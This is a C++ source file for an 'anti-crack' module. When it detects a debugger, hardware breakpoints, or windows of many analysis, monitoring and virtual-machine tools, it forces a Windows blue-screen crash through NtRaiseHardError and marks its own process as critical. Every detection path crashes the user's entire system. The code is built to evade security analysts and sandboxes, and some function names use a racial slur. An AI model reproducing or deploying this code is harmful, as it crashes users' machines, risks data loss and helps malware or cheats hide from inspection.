#include <Windows.h>
#include <thread>
#include <chrono>
#include <bcrypt.h>
#include <vector>
#include <set>
#include <unordered_set> // Added for efficient lookup

#pragma comment(lib, "ntdll.lib")

extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
    PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);

namespace BlueScreen
{
    typedef VOID(_stdcall* RtlSetProcessIsCritical)(
        IN BOOLEAN NewValue,
        OUT PBOOLEAN OldValue,
        IN BOOLEAN IsWinlogon);

    BOOL EnablePriv(LPCSTR lpszPriv) {
        HANDLE hToken;
        LUID luid;
        TOKEN_PRIVILEGES tkprivs;
        ZeroMemory(&tkprivs, sizeof(tkprivs));

        if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
            return FALSE;

        if (!LookupPrivilegeValue(NULL, lpszPriv, &luid))
        {
            CloseHandle(hToken); return FALSE;
        }

        tkprivs.PrivilegeCount = 1;
        tkprivs.Privileges[0].Luid = luid;
        tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
        CloseHandle(hToken);
        return bRet;
    }

    BOOL ProcessIsCritical()
    {
        HANDLE hDLL;
        RtlSetProcessIsCritical fSetCritical;

        hDLL = LoadLibraryA("ntdll.dll");
        if (hDLL != NULL)
        {
            EnablePriv(SE_DEBUG_NAME);
            (fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
            if (!fSetCritical) return 0;
            fSetCritical(TRUE, NULL, FALSE);
            return TRUE;
        }
        else
            return FALSE;
    }

    void BlueScreen()
    {
        BOOLEAN bl;
        ULONG Response;
        RtlAdjustPrivilege(19, TRUE, FALSE, &bl); // Enable SeShutdownPrivilege
        NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response); // Shutdown
    }
}

namespace AntiDebug
{
    bool CheckRemoteDebuggerPresentWrapper()
    {
        BOOL debuggerPresent = FALSE;
        CheckRemoteDebuggerPresent(GetCurrentProcess(), &debuggerPresent);
        return debuggerPresent == TRUE;
    }

    bool IsDebuggerPresentWrapper()
    {
        return IsDebuggerPresent();
    }

    bool HasDebugPermissions()
    {
        PCONTEXT ctx = reinterpret_cast<PCONTEXT>(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE));
        if (!ctx)
            return false;

        ctx->ContextFlags = CONTEXT_DEBUG_REGISTERS;

        if (GetThreadContext(GetCurrentThread(), ctx) == 0)
        {
            VirtualFree(ctx, 0, MEM_RELEASE);
            return false;
        }

        bool hasDebugPermissions = (ctx->Dr0 != 0 || ctx->Dr1 != 0 || ctx->Dr2 != 0 || ctx->Dr3 != 0);
        VirtualFree(ctx, 0, MEM_RELEASE);
        return hasDebugPermissions;
    }

    void AntiDebugLoop()
    {
        const std::chrono::milliseconds sleepDuration(5000); // Increased sleep duration

        std::unordered_set<std::string> debuggerWindowNames = {
             "The Wireshark Network Analyzer",
             "Progress Telerik Fiddler Web Debugger",
             "Fiddler",
             "OllyDbg",
             "x64dbg",
             "IDA Pro",
             "Immunity Debugger",
             "Cheat Engine",
             "VMWare",
             "VirtualBox",
             "QEMU",
             "Bochs",
             "Parallels Desktop",
             "Hyper-V Manager",
             "Debugger Detected",
             "IDA: Quick start",
            "Memory Viewer",
             "ollydbg.exe", "ProcessHacker.exe", "Dump-Fixer.exe", "kdstinker.exe",
            "tcpview.exe", "autoruns.exe", "autorunsc.exe", "filemon.exe", "procmon.exe",
            "regmon.exe", "procexp.exe", "ImmunityDebugger.exe", "Wireshark.exe",
            "dumpcap.exe", "HookExplorer.exe", "ImportREC.exe", "PETools.exe", "LordPE.exe",
            "dumpcap.exe", "SysInspector.exe", "proc_analyzer.exe", "sysAnalyzer.exe",
            "sniff_hit.exe", "windbg.exe", "joeboxcontrol.exe", "Fiddler.exe", "joeboxserver.exe",
            "ida64.exe", "ida.exe", "idaq64.exe", "Vmtoolsd.exe", "Vmwaretrat.exe",
            "Vmwareuser.exe", "Vmacthlp.exe", "vboxservice.exe", "vboxtray.exe", "ReClass.NET.exe",
            "x64dbg.exe", "OLLYDBG.exe", "Cheat Engine.exe", "cheatenginex86_64-SSE4-AVX2.exe",
            "MugenJinFuu-i386.exe", "Mugen JinFuu.exe", "MugenJinFuu-x86_64-SSE4-AVX2.exe", "MugenJinFuu-x86_64.exe",
            "KsDumper.exe", "dnSpy.exe", "cheatenginei386.exe", "cheatenginex86_64.exe", "Fiddler Everywhere.exe",
            "HTTPDebuggerSvc.exe", "Fiddler.WebUi.exe", "createdump.exe", "twistedlulu-x86_64-SSE4-AVX2.exe", "twistedlulu-x86_64.exe", "twistedlulu-i386.exe",
            "Beamer x96.exe", "Beamer x64.exe", "Beamer x32.exe", "Extreme Dumper x64.exe", "Extreme Dumper x32.exe",
            "x64.exe", "x32.exe", "exit.exe", "street.exe", "street", "exitcorp.exe"
        };

        for (;;) {
            if (CheckRemoteDebuggerPresentWrapper() || IsDebuggerPresentWrapper() || HasDebugPermissions()) {
                BlueScreen::BlueScreen();
                BlueScreen::ProcessIsCritical();
                ExitProcess(1); // Terminate the process
            }

            std::this_thread::sleep_for(sleepDuration);
        }
    }
}

class ShubhamAntiCrack
{
public:
    void bsod()
    {
        BlueScreen::BlueScreen();
        BlueScreen::ProcessIsCritical();
        ExitProcess(1); // Terminate the process
    }

    void nignog()
    {
        std::unordered_set<std::string> debuggerWindowNames = {
             "The Wireshark Network Analyzer",
             "Progress Telerik Fiddler Web Debugger",
             "Fiddler",
             "OllyDbg",
             "x64dbg",
             "IDA Pro",
             "Immunity Debugger",
             "Cheat Engine",
             "VMWare",
             "VirtualBox",
             "QEMU",
             "Bochs",
             "Parallels Desktop",
             "Hyper-V Manager",
             "Debugger Detected",
             "IDA: Quick start",
            "Memory Viewer",
             "ollydbg.exe", "ProcessHacker.exe", "Dump-Fixer.exe", "kdstinker.exe",
            "tcpview.exe", "autoruns.exe", "autorunsc.exe", "filemon.exe", "procmon.exe",
            "regmon.exe", "procexp.exe", "ImmunityDebugger.exe", "Wireshark.exe",
            "dumpcap.exe", "HookExplorer.exe", "ImportREC.exe", "PETools.exe", "LordPE.exe",
            "dumpcap.exe", "SysInspector.exe", "proc_analyzer.exe", "sysAnalyzer.exe",
            "sniff_hit.exe", "windbg.exe", "joeboxcontrol.exe", "Fiddler.exe", "joeboxserver.exe",
            "ida64.exe", "ida.exe", "idaq64.exe", "Vmtoolsd.exe", "Vmwaretrat.exe",
            "Vmwareuser.exe", "Vmacthlp.exe", "vboxservice.exe", "vboxtray.exe", "ReClass.NET.exe",
            "x64dbg.exe", "OLLYDBG.exe", "Cheat Engine.exe", "cheatenginex86_64-SSE4-AVX2.exe",
            "MugenJinFuu-i386.exe", "Mugen JinFuu.exe", "MugenJinFuu-x86_64-SSE4-AVX2.exe", "MugenJinFuu-x86_64.exe",
            "KsDumper.exe", "dnSpy.exe", "cheatenginei386.exe", "cheatenginex86_64.exe", "Fiddler Everywhere.exe",
            "HTTPDebuggerSvc.exe", "Fiddler.WebUi.exe", "createdump.exe", "twistedlulu-x86_64-SSE4-AVX2.exe", "twistedlulu-x86_64.exe", "twistedlulu-i386.exe",
            "Beamer x96.exe", "Beamer x64.exe", "Beamer x32.exe", "Extreme Dumper x64.exe", "Extreme Dumper x32.exe",
            "x64.exe", "x32.exe", "exit.exe", "street.exe", "street", "exitcorp.exe"
        };

        for (const std::string& windowName : debuggerWindowNames) {
            if (FindWindowA(NULL, windowName.c_str())) {
                bsod();
                break;
            }
        }
    }
};

ShubhamAntiCrack* ShubhamAntiCrackSystem;

namespace SmartyAntiDebugger
{
    void bsod()
    {
        BlueScreen::BlueScreen();
        BlueScreen::ProcessIsCritical();
        ExitProcess(1); // Terminate the process
    }

    void nignog()
    {
        std::unordered_set<std::string> debuggerWindowNames = {
             "The Wireshark Network Analyzer",
             "Progress Telerik Fiddler Web Debugger",
             "Fiddler",
             "OllyDbg",
             "x64dbg",
             "IDA Pro",
             "Immunity Debugger",
             "Cheat Engine",
             "VMWare",
             "VirtualBox",
             "QEMU",
             "Bochs",
             "Parallels Desktop",
             "Hyper-V Manager",
             "Debugger Detected",
             "IDA: Quick start",
            "Memory Viewer",
             "ollydbg.exe", "ProcessHacker.exe", "Dump-Fixer.exe", "kdstinker.exe",
            "tcpview.exe", "autoruns.exe", "autorunsc.exe", "filemon.exe", "procmon.exe",
            "regmon.exe", "procexp.exe", "ImmunityDebugger.exe", "Wireshark.exe",
            "dumpcap.exe", "HookExplorer.exe", "ImportREC.exe", "PETools.exe", "LordPE.exe",
            "dumpcap.exe", "SysInspector.exe", "proc_analyzer.exe", "sysAnalyzer.exe",
            "sniff_hit.exe", "windbg.exe", "joeboxcontrol.exe", "Fiddler.exe", "joeboxserver.exe",
            "ida64.exe", "ida.exe", "idaq64.exe", "Vmtoolsd.exe", "Vmwaretrat.exe",
            "Vmwareuser.exe", "Vmacthlp.exe", "vboxservice.exe", "vboxtray.exe", "ReClass.NET.exe",
            "x64dbg.exe", "OLLYDBG.exe", "Cheat Engine.exe", "cheatenginex86_64-SSE4-AVX2.exe",
            "MugenJinFuu-i386.exe", "Mugen JinFuu.exe", "MugenJinFuu-x86_64-SSE4-AVX2.exe", "MugenJinFuu-x86_64.exe",
            "KsDumper.exe", "dnSpy.exe", "cheatenginei386.exe", "cheatenginex86_64.exe", "Fiddler Everywhere.exe",
            "HTTPDebuggerSvc.exe", "Fiddler.WebUi.exe", "createdump.exe", "twistedlulu-x86_64-SSE4-AVX2.exe", "twistedlulu-x86_64.exe", "twistedlulu-i386.exe",
            "Beamer x96.exe", "Beamer x64.exe", "Beamer x32.exe", "Extreme Dumper x64.exe", "Extreme Dumper x32.exe",
            "x64.exe", "x32.exe", "exit.exe", "street.exe", "street", "exitcorp.exe"
        };

        for (const std::string& windowName : debuggerWindowNames)
        {
            if (FindWindowA(NULL, windowName.c_str()))
            {
                bsod();
                break;
            }
        }
    }
};
